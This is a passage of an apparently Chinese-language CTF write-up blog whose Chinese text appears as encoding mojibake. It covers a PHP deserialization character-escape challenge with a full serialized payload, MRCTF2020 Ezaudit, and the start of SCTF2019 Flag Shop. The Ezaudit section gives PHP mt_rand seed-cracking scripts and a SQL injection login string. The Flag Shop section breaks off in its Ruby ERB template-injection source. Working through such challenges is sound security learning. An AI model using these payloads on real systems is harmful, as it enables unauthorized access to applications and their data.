class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$x</span>-&gt;CtrlCase-&gt;test-&gt;sql = <span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„payload:</p><blockquote><p>O:4:â€Infoâ€:3:{s:3:â€ageâ€;s:1:â€1â€;s:8:â€nicknameâ€;s:1:â€2â€;s:8:â€CtrlCaseâ€;O:6:â€dbCtrlâ€:9:{s:8:â€hostnameâ€;s:9:â€127.0.0.1â€;s:6:â€dbuserâ€;s:4:â€rootâ€;s:6:â€dbpassâ€;s:4:â€rootâ€;s:8:â€databaseâ€;s:4:â€testâ€;s:4:â€nameâ€;s:5:â€adminâ€;s:8:â€passwordâ€;s:1:â€1â€;s:6:â€mysqliâ€;N;s:5:â€tokenâ€;N;s:4:â€testâ€;O:12:â€UpdateHelperâ€:1:{s:3:â€sqlâ€;O:4:â€Userâ€:3:{s:2:â€idâ€;s:1:â€1â€;s:3:â€ageâ€;s:72:â€select â€œ1â€,â€c4ca4238a0b923820dcc509a6f75849bâ€ from user where username=?â€;s:8:â€nicknameâ€;O:4:â€Infoâ€:3:{s:3:â€ageâ€;s:1:â€1â€;s:8:â€nicknameâ€;s:1:â€2â€;s:8:â€CtrlCaseâ€;O:6:â€dbCtrlâ€:9:{s:8:â€hostnameâ€;s:9:â€127.0.0.1â€;s:6:â€dbuserâ€;s:4:â€rootâ€;s:6:â€dbpassâ€;s:4:â€rootâ€;s:8:â€databaseâ€;s:4:â€testâ€;s:4:â€nameâ€;s:5:â€adminâ€;s:8:â€passwordâ€;s:1:â€1â€;s:6:â€mysqliâ€;N;s:5:â€tokenâ€;N;s:4:â€testâ€;O:12:â€UpdateHelperâ€:1:{s:3:â€sqlâ€;N;}}}}}}}</p></blockquote><p>ç”±äºlib.phpä¸­æœ‰:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$Info</span> = unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    <span class="variable">$age</span> = <span class="variable">$Info</span>-&gt;age;</span><br><span class="line">    <span class="variable">$nickname</span> = <span class="variable">$Info</span>-&gt;nickname;</span><br><span class="line">    <span class="variable">$updateAction</span> = <span class="keyword">new</span> UpdateHelper(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>], <span class="variable">$Info</span>, <span class="string">&quot;update user SET age=<span class="subst">$age</span>,nickname=<span class="subst">$nickname</span> where id=&quot;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$age</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">    <span class="variable">$nickname</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info(<span class="variable">$age</span>, <span class="variable">$nickname</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ç»•è¿‡getNewInfoæ–¹æ³•é‡Œçš„serizlize()ã€‚</p><blockquote><p>age=1â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€™â€;s:8:â€nicknameâ€;s:1:â€2â€;s:8:â€CtrlCaseâ€;O:6:â€dbCtrlâ€:9:{s:8:â€hostnameâ€;s:9:â€127.0.0.1â€;s:6:â€dbuserâ€;s:4:â€rootâ€;s:6:â€dbpassâ€;s:4:â€rootâ€;s:8:â€databaseâ€;s:4:â€testâ€;s:4:â€nameâ€;s:5:â€adminâ€;s:8:â€passwordâ€;s:1:â€1â€;s:6:â€mysqliâ€;N;s:5:â€tokenâ€;N;s:4:â€testâ€;O:12:â€UpdateHelperâ€:1:{s:3:â€sqlâ€;O:4:â€Userâ€:3:{s:2:â€idâ€;s:1:â€1â€;s:3:â€ageâ€;s:72:â€select â€œ1â€,â€c4ca4238a0b923820dcc509a6f75849bâ€ from user where username=?â€;s:8:â€nicknameâ€;O:4:â€Infoâ€:3:{s:3:â€ageâ€;s:1:â€1â€;s:8:â€nicknameâ€;s:1:â€2â€;s:8:â€CtrlCaseâ€;O:6:â€dbCtrlâ€:9:{s:8:â€hostnameâ€;s:9:â€127.0.0.1â€;s:6:â€dbuserâ€;s:4:â€rootâ€;s:6:â€dbpassâ€;s:4:â€rootâ€;s:8:â€databaseâ€;s:4:â€testâ€;s:4:â€nameâ€;s:5:â€adminâ€;s:8:â€passwordâ€;s:1:â€1â€;s:6:â€mysqliâ€;N;s:5:â€tokenâ€;N;s:4:â€testâ€;O:12:â€UpdateHelperâ€:1:{s:3:â€sqlâ€;N;}}}}}}}</p></blockquote><p>ç›´æ¥ä»update.phpè¾“å…¥ï¼Œç„¶åä»»æ„å¯†ç ç™»é™†å³å¯ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210805151951659.png"></p><blockquote><p>flag{4caee143-cb5b-48e5-bc67-37a8eaa6f830}</p></blockquote><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>è¿™é¢˜åˆšçœ‹é¢˜ç›®æˆ‘è¿˜ä»¥ä¸ºæ˜¯è¦çœ‹auditæ—¥å¿—è¯»ä¸œè¥¿å•¥çš„ï¼Œç»“æœå°±åªæ˜¯mtç§å­çˆ†ç ´ã€‚</p><h3 id="phpä½ç‰ˆæœ¬mtç§å­çˆ†ç ´"><a href="#phpä½ç‰ˆæœ¬mtç§å­çˆ†ç ´" class="headerlink" title="phpä½ç‰ˆæœ¬mtç§å­çˆ†ç ´"></a>phpä½ç‰ˆæœ¬mtç§å­çˆ†ç ´</h3><p>www.zipæ–‡ä»¶æ³„éœ²å‡ºäº†index.phpæºç ï¼Œä¸”å¾—çŸ¥phpç‰ˆæœ¬ä¸ºphp5.6ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$Private_key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$username</span> == <span class="string">&#x27;&#x27;</span>) || (<span class="variable">$password</span> == <span class="string">&#x27;&#x27;</span>) ||(<span class="variable">$Private_key</span> == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$Private_key</span> != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$Private_key</span> === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getuser</span> = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">            <span class="variable">$link</span>=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">            mysql_select_db(<span class="string">&quot;test&quot;</span>,<span class="variable">$link</span>);</span><br><span class="line">            <span class="variable">$result</span> = mysql_query(<span class="variable">$getuser</span>);</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$row</span>=mysql_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="variable">$row</span>[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$public_key</span> .= substr(<span class="variable">$strings1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$public_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    <span class="variable">$private_key</span> .= substr(<span class="variable">$strings2</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$private_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$Public_key</span> = public_key();</span><br><span class="line"><span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p>phpä½ç‰ˆæœ¬çš„mtç§å­é—®é¢˜ï¼Œå†™ä¸ªè„šæœ¬å¯¼å‡ºå€¼ï¼Œç„¶åphp_mt_seedä¸€æŠŠæ¢­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">char = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">public_key = <span class="string">&quot;KVQP0LdJKRaV3n9D&quot;</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;[+]Result is: &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> public_key:</span><br><span class="line">    print(<span class="built_in">str</span>(char.index(i)) + <span class="string">&quot; &quot;</span> + <span class="built_in">str</span>(char.index(i)) + <span class="string">&quot; 0 &quot;</span> + <span class="string">&quot;61&quot;</span>, end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure><p>ä¸€æŠŠæ¢­ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210808112013845.png"></p><p>å¾—åˆ°çš„å€¼åœ¨php[5.2.1 - 7.0.x]é‡æ–°è®¡ç®—ç§é’¥çš„å€¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    mt_srand(<span class="number">1775196155</span>);</span><br><span class="line">    <span class="variable">$strings1</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$public_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">        <span class="variable">$public_key</span> .= substr(<span class="variable">$strings1</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    private_key();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params"><span class="variable">$length</span> = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$strings2</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$private_key</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">        <span class="variable">$private_key</span> .= substr(<span class="variable">$strings2</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$strings2</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$private_key</span>;</span><br><span class="line">&#125;</span><br><span class="line">public_key();</span><br></pre></td></tr></table></figure><blockquote><p>XuNhoueCDCGc</p></blockquote><p>æœ‰ç§é’¥çš„å€¼ç›´æ¥ç™»é™†å³å¯ï¼Œå¯†ç é‚£è¿˜æœ‰ä¸ªç®€å•sqlã€‚</p><blockquote><p>Private_key=XuNhoueCDCGc&amp;login=ç™»å½•&amp;password=â€™+or+â€™1â€™=â€™1&amp;username=crispr</p></blockquote><p>å¾—åˆ°flag</p><blockquote><p>flag{9227093c-e6ac-4b87-b77b-516945f26eda}</p></blockquote><h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p>evoAå¸ˆå‚…å‡ºçš„é¢˜ï¼Œè¿™é‡Œç®€å•è®²è®²é¢„æœŸè§£ï¼Œéé¢„æœŸè§£ä¹ŸæŒºæœ‰æ„æ€çš„ï¼Œå…·ä½“å¯ä»¥çœ‹çœ‹<a href="https://evoa.me/archives/15/">evoAå¸ˆå‚…çš„åšå®¢</a>è®²çš„æ›´è¯¦ç»†ç‚¹ã€‚</p><h3 id="rubyæ¨¡æ¿æ³¨å…¥"><a href="#rubyæ¨¡æ¿æ³¨å…¥" class="headerlink" title="rubyæ¨¡æ¿æ³¨å…¥"></a>rubyæ¨¡æ¿æ³¨å…¥</h3><p>åœ¨/robots.txté‡Œå¯ä»¥çœ‹åˆ°æç¤ºï¼Œå­˜åœ¨/filebakè·¯ç”±ï¼Œç›´æ¥ç»™å‡ºäº†æºç ã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/cookies&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra/json&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;jwt&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;securerandom&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(<span class="keyword">__FILE__</span>) + <span class="string">&#x27;/static&#x27;</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">&quot;SECRET&quot;</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(<span class="keyword">__FILE__</span>) + <span class="string">&#x27;/../log/http.log&#x27;</span>,<span class="string">&quot;a+&quot;</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/&quot;</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">&#x27;/shop&#x27;</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/filebak&quot;</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread <span class="keyword">__FILE__</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/auth&quot;</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/api/info&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">&quot;uid&quot;</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;/work&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">&quot;SECRET&quot;</span>].match(<span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)</span><br><span class="line">      puts ENV[<span class="string">&quot;FLAG&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">&quot;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working&quot;</span> <span class="keyword">then</span></span><br><span class="line">    auth[<span class="string">&quot;jkl&quot;</span>] = auth[<span class="string">&quot;jkl&quot;</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&quot;/shop&quot;</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">&#x27;HS256&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">&quot;jkl&quot;</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;error&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;no enough jkl&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">&quot;FLAG&quot;</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">&quot;SECRET&quot;</span>] , <span class="string">&#x27;HS256&#x27;</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">&quot;success&quot;</span>,<span class="symbol">message:</span> <span class="string">&quot;jkl is good thing&quot;</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">&#x27;/shop&#x27;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ˜¯rubyçš„erbæ¨¡æ¿æ³¨å…¥ï¼Œæ ¸å¿ƒä»£ç å°±æ˜¯è¿™ä¸ª</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 